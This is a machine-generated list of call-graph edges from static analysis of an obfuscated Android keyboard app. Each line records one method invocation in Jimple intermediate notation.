SPECIAL edge: $r12 = specialinvoke r0.<lvr: java.util.Map$Entry d(java.lang.String,int)>($r10, $i3) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry d(java.lang.String,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lid: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getKey()>
STATIC edge: $r5 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>($r2, $i1, $i0) in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.util.Arrays: java.lang.Object[] copyOfRange(java.lang.Object[],int,int)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <j$.util.concurrent.v: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.String: void <init>(char[])> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<java.lang.StringBuilder: void <init>()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r3, "logSiteKey") in <lsn: boolean ac()> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<ltf: void <init>(lto)>($r1) in <lth: void <init>(lto)> ==> <ltf: void <init>(lto)>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lqr: int hashCode()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String concat(java.lang.String)>(" must not be null") in <ojg: void c(java.lang.Object,java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lkt: void <init>(int)> ==> <java.lang.Object: void <init>()>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r0, $i1, $r1, $i0, $i2) in <nvw: void j(int[],int[],int,int,int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
STATIC edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>($r2, $i7, $r10) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: void j(j$.util.concurrent.l[],int,j$.util.concurrent.l)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(6) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
INTERFACE edge: $z0 = interfaceinvoke $r7.<java.util.Iterator: boolean hasNext()>() in <lmb: lme f()> ==> <liz: boolean hasNext()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.List: boolean isEmpty()>() in <ivv: int h()> ==> <java.util.ArrayList: boolean isEmpty()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.String toString()>() in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $i1 = virtualinvoke $r1.<lkq: int size()>() in <lkm: void <init>(lkq,int)> ==> <lqm: int size()>
SPECIAL edge: specialinvoke $r2.<lsk: void <init>(java.lang.Class)>(class "Llvt;") in <lsl: void <clinit>()> ==> <lsk: void <init>(java.lang.Class)>
SPECIAL edge: specialinvoke $r5.<java.util.WeakHashMap: void <init>()>() in <hcb: void <init>()> ==> <java.util.WeakHashMap: void <init>()>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(5) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int d(int)>($i0) in <ljd: java.util.Map m()> ==> <ljd: int d(int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean f(ivv)>(r0) in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean f(ivv)>
STATIC edge: staticinvoke <java.lang.Thread: void yield()>() in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] f()> ==> <java.lang.Thread: void yield()>
SPECIAL edge: specialinvoke $r0.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("initialized", $r1) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<liz: void <init>(ljd)>($r1) in <liw: void <init>(ljd)> ==> <liz: void <init>(ljd)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int c()>() in <ljd: java.util.Map m()> ==> <ljd: int c()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorFeaturedMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r1.<jlu: void <init>(int)>(9) in <lvt: void <clinit>()> ==> <jlu: void <init>(int)>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int min(int,int)>(1073741823, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int min(int,int)>
STATIC edge: $l0 = staticinvoke <android.os.SystemClock: long elapsedRealtime()>() in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <android.os.SystemClock: long elapsedRealtime()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <lvt: boolean equals(java.lang.Object)>
SPECIAL edge: $i4 = specialinvoke r0.<ljd: int z(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: int z(int,int,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkx: lma g()>() in <lkx: lma q()> ==> <lqq: lma g()>
SPECIAL edge: specialinvoke $r2.<j$.sun.misc.b: void <init>(sun.misc.Unsafe)>($r4) in <j$.sun.misc.b: void <clinit>()> ==> <j$.sun.misc.b: void <init>(sun.misc.Unsafe)>
STATIC edge: $r1 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/libs/framework/core/AppBase") in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, null, null) in <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r2.<lts: lsz c(int)>($i1) in <lsd: boolean b(lsr)> ==> <ltr: lsz c(int)>
STATIC edge: $z0 = staticinvoke <lri: boolean V(java.util.List,java.lang.Object)>(r0, $r1) in <lkq: boolean equals(java.lang.Object)> ==> <lri: boolean V(java.util.List,java.lang.Object)>
CLINIT edge: staticinvoke <java.lang.Float: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Float: void <clinit>()>
STATIC edge: $r3 = staticinvoke <lma: lma r(java.lang.Object)>($r5) in <lly: lma g()> ==> <lma: lma r(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<ivw: boolean P()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: boolean P()>
STATIC edge: staticinvoke <izw: void as(int,java.lang.String)>($i0, "initialCapacity") in <lkg: void <init>(int)> ==> <izw: void as(int,java.lang.String)>
SPECIAL edge: specialinvoke $r20.<mag: void <init>(java.lang.String,int,int)>("NATIVE_CARD", 20, 20) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <lum: lto d(java.lang.String)>($r2) in <lth: lth i(java.lang.String)> ==> <lum: lto d(java.lang.String)>
VIRTUAL edge: $r18 = virtualinvoke r0.<lsn: lsc c()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsf: lsc c()>
STATIC edge: $r1 = staticinvoke <iwt: java.lang.String d(java.lang.String)>($r1) in <ivv: void g(java.lang.String)> ==> <iwt: java.lang.String d(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <ltc: void <init>(java.lang.String,int,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r6.<lkt: void a(java.lang.Object,java.lang.Object)>($r3, $r11) in <lmb: lme f()> ==> <lkt: void a(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<ljf: void q(int)>($i4) in <ljf: int o(int,int,int,int)> ==> <ljf: void q(int)>
STATIC edge: $z0 = staticinvoke <java.util.Arrays: boolean equals(short[],short[])>($r6, $r7) in <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)> ==> <java.util.Arrays: boolean equals(short[],short[])>
SPECIAL edge: specialinvoke $r4.<java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>("segmentMask", $r2) in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.io.ObjectStreamField: void <init>(java.lang.String,java.lang.Class)>
VIRTUAL edge: $r4 = virtualinvoke $r0.<androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>(null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: java.lang.String getType(android.net.Uri)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(11) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
VIRTUAL edge: $r15 = virtualinvoke $r13.<lvq: java.lang.Object c(int)>($i7) in <lvr: void <init>(lvr,lvr)> ==> <lvq: java.lang.Object c(int)>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke r0.<qj: void <init>()>() in <qc: void <init>()> ==> <qj: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke $r2.<ljd: java.util.Iterator l()>() in <liy: java.util.Iterator iterator()> ==> <ljd: java.util.Iterator l()>
SPECIAL edge: specialinvoke r0.<ljd: void A(int)>($i4) in <ljd: int z(int,int,int,int)> ==> <ljd: void A(int)>
SPECIAL edge: specialinvoke $r1.<lqm: void <init>(lqn)>(r0) in <lqn: lkq f()> ==> <lqm: void <init>(lqn)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(18) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r3.<java.lang.StringBuilder: void <init>()>() in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r0 = virtualinvoke $r0.<java.lang.String: java.lang.String replace(char,char)>(47, 46) in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: java.lang.String replace(char,char)>
SPECIAL edge: specialinvoke $r0.<lte: void <init>()>() in <ltf: void <clinit>()> ==> <lte: void <init>()>
STATIC edge: $r3 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r2) in <lwf: void <clinit>()> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <ivw: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r7.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_THUMBNAIL", 7, 7) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r11.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r4) in <luk: lum a(java.lang.String[])> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r1, "metadata value") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Object: java.lang.Object clone()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <lsh: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkx: java.lang.Object get(java.lang.Object)>($r1) in <lme: lma d(java.lang.Object)> ==> <lqq: java.lang.Object get(java.lang.Object)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_UserUnlocked", $r2) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
SPECIAL edge: specialinvoke $r8.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int f(java.lang.Object)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r0.<lqc: void <init>()>() in <lqc: void <clinit>()> ==> <lqc: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lmo: int a(java.lang.Object,java.lang.Object)>($r8, $r3) in <lqs: boolean containsAll(java.util.Collection)> ==> <lmo: int a(java.lang.Object,java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ag(int,int,int)>($i2, 0, $i1) in <ljf: void j(int,java.lang.Object,int,int)> ==> <izw: int ag(int,int,int)>
INTERFACE edge: $r3 = interfaceinvoke $r7.<java.util.Iterator: java.lang.Object next()>() in <lmb: lme f()> ==> <liz: java.lang.Object next()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "baseCount") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <coo: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke $r30.<hfd: void <init>(axu,java.lang.Class,ldp)>($r20, class "Ljava/nio/ByteBuffer;", $r19) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hfd: void <init>(axu,java.lang.Class,ldp)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
STATIC edge: $r3 = staticinvoke <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>($r5, $r2) in <lmb: lme f()> ==> <lkq: lkq A(java.util.Comparator,java.lang.Iterable)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/apps/inputmethod/latin/LatinApp") in <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lma: int hashCode()>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("stack_size", class "Lltc;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
STATIC edge: staticinvoke <lsc: void f(java.lang.String,ltn)>($r3, r0) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsc: void f(java.lang.String,ltn)>
SPECIAL edge: specialinvoke r0.<ivv: void <init>()>() in <ivv: void <init>(byte[])> ==> <ivv: void <init>()>
SPECIAL edge: specialinvoke $r17.<mag: void <init>(java.lang.String,int,int)>("EXPRESSIVE_STICKER_AUTOCOMPLETE", 17, 17) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i0 = virtualinvoke $r2.<lts: int b()>() in <lsd: boolean b(lsr)> ==> <ltr: int b()>
STATIC edge: $i0 = staticinvoke <lkg: int a(int,int)>($i0, $i1) in <lkt: void e(int)> ==> <lkg: int a(int,int)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(7) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int size()>() in <ljd: boolean isEmpty()> ==> <ljd: int size()>
VIRTUAL edge: $i0 = virtualinvoke r0.<qj: int b(java.lang.Object)>($r2) in <qj: java.lang.Object get(java.lang.Object)> ==> <qj: int b(java.lang.Object)>
SPECIAL edge: $r4 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object[] s()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lsz: java.lang.Object d(java.lang.Object)>($r3) in <lsm: java.lang.Object d(lsz)> ==> <lsz: java.lang.Object d(java.lang.Object)>
SPECIAL edge: $z0 = specialinvoke r0.<lmo: boolean containsAll(java.util.Collection)>($r10) in <lqs: boolean containsAll(java.util.Collection)> ==> <java.util.AbstractCollection: boolean containsAll(java.util.Collection)>
SPECIAL edge: specialinvoke r0.<lkg: void g(int)>($i0) in <lkg: void c(java.lang.Object)> ==> <lkg: void g(int)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(18) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.c: void <init>(long)>($l0) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.util.concurrent.c: void <init>(long)>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean z(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<ljd: int d(int)>($i0) in <liz: java.lang.Object next()> ==> <ljd: int d(int)>
CLINIT edge: staticinvoke <java.lang.Character$UnicodeBlock: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Character$UnicodeBlock: void <clinit>()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<dwx: void <init>(int)>(3) in <dwx: void <clinit>()> ==> <dwx: void <init>(int)>
INTERFACE edge: $r7 = interfaceinvoke $r3.<java.util.Map: java.util.Set entrySet()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.util.Set entrySet()>
STATIC edge: $r0 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>($r0, $r3) in <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s g(j$.util.concurrent.s,j$.util.concurrent.s)>
CLINIT edge: staticinvoke <lkh: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkh: void <clinit>()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lig: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>($r1, null) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])>
VIRTUAL edge: $r10 = virtualinvoke $r9.<lma: lsa l()>() in <hbv: void j()> ==> <lqs: lsa l()>
STATIC edge: $z0 = staticinvoke <lvr: boolean e(int,int)>($i1, $i0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: boolean e(int,int)>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lrg: int size()>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lkq: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>($r1, 0, $r2, $i1, $i0) in <lqr: int b(java.lang.Object[],int)> ==> <java.lang.System: void arraycopy(java.lang.Object,int,java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
STATIC edge: $i2 = staticinvoke <izw: int ac(int)>($i0) in <lly: void j(java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <lly: lma g()> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lqs: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<ltc: void <init>(java.lang.String,int,int)>("MEDIUM", 1, 20) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("CuratedImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: virtualinvoke $r7.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Incomplete privateUse subtag, error index: ") in <nzh: boolean f(ivv)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $l3 = virtualinvoke $r17.<java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicLong: long getAndIncrement()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(58) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: int indexOf(java.lang.String,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<her: void <init>(miy)>($r0) in <her: her k(miy)> ==> <her: void <init>(miy)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: int[] w()>
SPECIAL edge: specialinvoke $r4.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("identifier must not be empty") in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $z2 = virtualinvoke $r2.<j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>(r0, $l3, $l4, $l5) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean d(java.lang.Object,long,long,long)>
SPECIAL edge: $r5 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: java.lang.Object p()>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l0, $i1, $i2) in <j$.util.concurrent.ConcurrentHashMap: void a(long,int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r0 = staticinvoke <java.lang.Runtime: java.lang.Runtime getRuntime()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <java.lang.Runtime: java.lang.Runtime getRuntime()>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractSet: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <lid: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<lth: void <init>(lto)>($r1) in <lth: lth i(java.lang.String)> ==> <lth: void <init>(lto)>
VIRTUAL edge: virtualinvoke $r0.<androidx.core.content.FileProvider: void attachInfo(android.content.Context,android.content.pm.ProviderInfo)>(null, null) in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: void attachInfo(android.content.Context,android.content.pm.ProviderInfo)>
SPECIAL edge: specialinvoke $r6.<j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>($i0, $r1, $r2) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.l: void <init>(int,java.lang.Object,java.lang.Object)>
INTERFACE edge: $r11 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getKey()>() in <hbv: void j()> ==> <lki: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(7) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r1) in <lma: lma i(int,java.lang.Object[])> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<lsn: void q(lsz,java.lang.Object)>($r13, $r11) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <lsn: void q(lsz,java.lang.Object)>
STATIC edge: $z0 = staticinvoke <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>($r1) in <ivv: ivw b(java.lang.String)> ==> <android.text.TextUtils: boolean isEmpty(java.lang.CharSequence)>
STATIC edge: $i0 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: int k(int)>($i0) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: int k(int)>
SPECIAL edge: specialinvoke $r0.<mag: void <init>(java.lang.String,int,int)>("UNKNOWN_SEARCH_FEATURE", 0, 0) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
